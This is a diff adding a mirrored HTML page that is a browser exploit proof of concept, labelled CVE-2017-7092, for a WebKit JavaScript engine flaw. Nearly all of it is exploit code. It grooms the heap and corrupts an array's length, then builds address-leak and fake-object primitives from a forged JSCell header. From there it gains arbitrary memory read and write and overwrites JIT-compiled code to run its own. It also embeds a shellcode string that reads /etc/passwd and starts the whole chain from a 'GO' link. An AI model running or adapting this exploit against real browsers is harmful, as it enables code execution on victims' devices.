@@ -1,0 +1,297 @@
+<html>
+
+<!-- Mirrored from jandj.site/arb/jscellv1.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 21 Apr 2018 21:08:16 GMT -->
+<meta charset="UTF-8">
+ <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+ <meta name="apple-mobile-web-app-capable" content="yes">
+ <meta name="format-detection" content="telephone=no">
+ <meta name="apple-mobile-web-app-status-bar-style" content="black">
+<head>
+    <script>
+//        CVE-2017-7092 PoC
+		alert("loaded! Click GO!");
+    big_array = [];
+    debug = 1;
+    arr = [0x00, 0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70];
+    evil_buffer = 0x80;
+    bigarray_buffer_index = 1;
+    buffer_arr_index = 1;
+    function_to_shellcode = "\x31\xc0\x40\x74\x3a\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
+    function log(txt) {
+        var c = document.createElement("div");
+        c.innerHTML = "log: " + txt;
+        d.appendChild(c);
+    }
+    function debug_alert(str){
+        if(debug){
+            alert(str);
+            log(str);
+        }
+    }
+    function gc() {
+        debug_alert("gc");
+        for(i = 0;i < 0x924924;i++){   //0x4924924
+            arr[i] = new ArrayBuffer(20);  //54
+        }
+        debug_alert("gcc");
+    }
+    function gc2() {
+        try {
+            var c = document.createElement("canvas");
+            var gl = c.getContext("2d");
+            for (var i = 0; i < 100; i++) {
+                var gggg = gl.createImageData(1, 0x10000/4)
+            }
+        } catch (e) {
+        }
+    }
+    function make_a_big_hole(){
+        g = []
+        gg = "g".repeat(0x7fff1000)
+        debug_alert("big_hole");
+        for(var i = 0; i < 5;i++){
+            g[i] = String.prototype.fontsize.call(gg,5);
+        }
+        debug_alert("after_big_hole");
+        for(var i = 0; i < 0x3;i++){
+            g[0] = null;
+            g[1] = null;
+            g[2] = null;
+            g[3] = null;
+        }
+        //g = null;
+        debug_alert("big_array");
+        init_big_array_len = 0x10000000;
+        g[2] = new Array(init_big_array_len);
+        g[2].fill(1.1);
+        debug_alert("after_big_array");
+        big_array = g[2];
+        evil_float64 = new Float64Array(new ArrayBuffer(0x7ffffff0));
+        arr2 = []; arr2[0] = evil_float64;
+        heap_feng_shui();
+        gg = null;
+        gc();
+    }
+    function make_evil_data(){
+        nop = "\x00"
+        nop_data = "\x38\x1e\x38"
+        offset = 0x38 + 0x1e +0x38
+        nop_data = nop.repeat(offset/2);
+        nop_data = nop_data + "\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff"
+        nop_data = nop_data + unescape("%uffff%uffff%uffff%uffff") + "\x00\x00\x00\x00" + unescape("%uffff%uffff%uffff%uffff");
+        ff = "\x00"
+        ff_data = ff.repeat((0x1000-offset-0x18)/2);
+        return nop_data + ff_data;
+    }
+    function heap_feng_shui(){
+        debug_alert("heap_feng_shui");
+        arr2 = []
+        buffer_arr = []
+       for(var i = 0;i < 20;i++){
+            arr2[i] = new Array(0x1000);
+            buffer_arr[i] = new Float64Array(0x2000001);
+            buffer_arr[i].fill(1.1);  //float64  1.1   ==  array   1.0375
+        }
+        for(var i = 0;i < 0x18000;i++){
+            evil_float64 = new Float64Array(new ArrayBuffer(0x8000));
+            evil_float64.fill(1.1);
+            buffer_arr[i] = evil_float64;
+        }
+        debug_alert("after_heap_feng_shui");
+    }
+    function f64tou32(number){
+        a = new Float64Array(0x8);
+        a.fill(number);
+        b = new Uint32Array(a.buffer);
+        result = [];
+        result[0] = b[0];
+        result[1] = b[1];
+        return result;
+    }
+    function u32tof64(arr){
+        b = new Uint32Array(0x8);
+        b[1] = arr[1];
+        b[0] = arr[0];
+        a = new Float64Array(b.buffer);
+        return a[0];
+    }
+    function read_obj(obj){
+        big_array[bigarray_buffer_index] = obj;
+        f64_address = buffer_arr[buffer_arr_index][0x50/8];
+        uint32 = f64tou32(f64_address);
+        alert(uint32[1].toString(16)+ "  " + uint32[0].toString(16));
+        return uint32;
+        alert(uint32[1].toString(16)+ "  " + uint32[0].toString(16));
+    }
+    function fake_obj(arr_address){
+        f64_address = u32tof64(arr_address);
+        alert(f64_address);
+        buffer_arr[buffer_arr_index][0x50/8] = f64_address;
+        alert("here");
+        return big_array[bigarray_buffer_index];
+    }
+    function randomString(){
+        chars = "abcdefghijklmnopq";
+        maxPos = chars.length;
+        result = "";
+        for(i = 0;i < 0x8;i++){
+            result += chars.charAt(Math.floor(Math.random() * maxPos));
+        }
+        return result;
+    }
+    function sprayFloat64ArrayStru(){
+        for(var i = 0; i < 0x1000;i++){
+            var a = new Float64Array(1);
+            a[randomString()] = 1337;
+        }
+    }
+    function Int64(arr){
+        uint32 = [];
+        uint32[0] = arr[0];
+        uint32[1] = arr[1] - 0x10000;
+        f = u32tof64(uint32);
+        return f;
+    }
+    function Int64_add(arr,num){
+        arr[0] = arr[0] + num;
+        return arr;
+    }
+    function read_64(addr){
+        f = u32tof64(addr);
+        fakearray[0x2] = f;
+        result = [];
+        result[0] = evil_buffer_array[0];
+        result[1] = evil_buffer_array[1];
+        alert(result[1].toString(16)+ "  " + result[0].toString(16));
+        return result;
+    }
+    function write_32(addr,data){
+        f = u32tof64(addr);
+        fakearray[0x2] = f;
+        evil_buffer_array[0] = data;
+    }
+    function make_jit_function(){
+        func_body = "eval('');abc = [];"
+        for(i = 0;i<500;i++){
+            func_body += "abc[" + i.toString() + "];"
+        }
+        function_to_shellcode = new Function("a",func_body);
+        for(i = 0;i < 100; i++){
+            function_to_shellcode();
+        }
+    }
+    function trigger() {
+        make_jit_function();
+        evil_data = make_evil_data();
+        a = evil_data.repeat(0x7fff00/0x800);
+        z = a.slice(1);
+        x = "\"".repeat(0x2aaaaaa0);
+      alert("The evil_data Array length is 0x" + evil_data.length.toString(16));
+        make_a_big_hole();
+        alert("The big_array Array length is 0x" + big_array.length.toString(16));
+        z = String.prototype.link.call(a,x);
+        heap_feng_shui();
+        heap_feng_shui();
+        alert("end");
+     Array.prototype.slice.call(arr,1);
+        Array.prototype.slice.call(buffer_arr,1);
+        t = Array.prototype.slice.call(big_array,0x10000001,0x10000002);
+        t = Array.prototype.slice.call(buffer_arr,1,2);
+        if(big_array.length != init_big_array_len){
+            alert("Success!The Array length is 0x" + big_array.length.toString(16));
+            alert(big_array[0x1]);
+            for(var i = 0x10000000;i < big_array.length;i++){
+                if(big_array[i] != undefined  && big_array[i] != -1){
+                    alert(i.toString(16));
+                    alert(big_array[i]);
+                }
+            }
+            flag = 0;
+            for(var i = 0x35000000;i < 0x4a000000;i=i+0x2000){  //0x4a000000
+                alert(i.toString(16));
+                if(big_array[i] == 1.0375){
+                    alert("find Success");
+                    bigarray_buffer_index = i;
+                    big_array[bigarray_buffer_index] = 3.3333333;
+                    j = 0;
+                    while(j<0x18000){
+                        if(buffer_arr[j][0x50/8] != 1.1){
+                            buffer_arr_index = j;
+                            flag = 1;
+                            break;
+                        }
+                        j++;
+                    }
+                    break;
+                }
+            }
+            if(flag == 0){
+                alert("can't find buffer!");
+                window.location.reload();
+            }
+        }
+        else{
+            alert("can't overwrite the length!");
+            window.location.reload();
+        }
+        alert(buffer_arr_index);  
+        make_jit_function();
+        sprayFloat64ArrayStru();
+        evil_buffer_array = new Uint32Array(0x1000);
+        var jsCellHeader = Int64([0x00001000,0x11827000]);
+        var lengthFlags = Int64([0x00000010,0x00010000]);
+        var container = {
+            jsCell : jsCellHeader,
+            butterfly : false,
+            vector : evil_buffer_array,
+            lengthAndFlags : lengthFlags
+        };
+        address = Int64_add(read_obj(container),0x10);
+        alert(address[1].toString(16) + "  " + address[0].toString(16));
+        fakearray = fake_obj(address);
+        String.prototype.link.call(container);
+        while(!(fakearray instanceof Float64Array)){
+            i = 1;
+            jsCellHeader = Int64([0x00001000+i,0x11827000]);
+            container.jsCell = jsCellHeader;
+            i++;
+        }
+        String.prototype.link.call(fakearray);
+       
+        
+        func_addr = read_obj(function_to_shellcode);
+       alert(func_addr[1].toString(16)+ "  " + func_addr[0].toString(16));
+        executableAddr = read_64(Int64_add(func_addr,0x18));
+        jitCodeAddr = read_64(Int64_add(executableAddr,0x18));
+        codeAddr = read_64(Int64_add(jitCodeAddr,0x20));
+        write_32(codeAddr,0xcccccccc);
+        codeAddr = read_64(Int64_add(jitCodeAddr,0x10));
+        write_32(codeAddr,0xcccccccc);
+        alert("begin_shellcode");
+        function_to_shellcode();
+        alert("end");
+        
+    }
+    </script>
+</head>
+<body>
+<center>
+<br />
+<h1>
+<p>jsCELL</p>
+<h2>BY: JohnVS</h2>
+<a href="javascript:trigger()">GO</a>
+</h1>
+<pre id="d">0.0.2
+</pre>
+</center>
+</body>
+            <script>
+                // display JS errors as alerts. Helps debugging.
+                window.onerror = function(error, url, line) {
+                    alert(error+' URL:'+url+' L:'+line);
+                };
+            </script>
+
+<!-- Mirrored from jandj.site/arb/jscellv1.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 21 Apr 2018 21:08:16 GMT -->
+</html>
